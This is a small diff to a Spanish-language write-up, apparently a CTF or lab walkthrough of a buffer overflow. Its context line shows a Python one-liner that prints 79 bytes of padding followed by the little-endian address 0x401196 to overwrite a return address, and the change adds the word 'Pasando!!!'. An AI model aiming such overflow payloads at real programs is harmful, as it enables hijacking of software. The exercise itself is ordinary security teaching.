@@ -54,4 +54,4 @@ Comienza en 0x401196 teniendo en cuenta el endian, nuestro script será el sigui
 print ('X' * 79 + "\x96\x11\x40\x00")
 ```
 ![8](Capturas/8.png)
-
+Pasando!!!
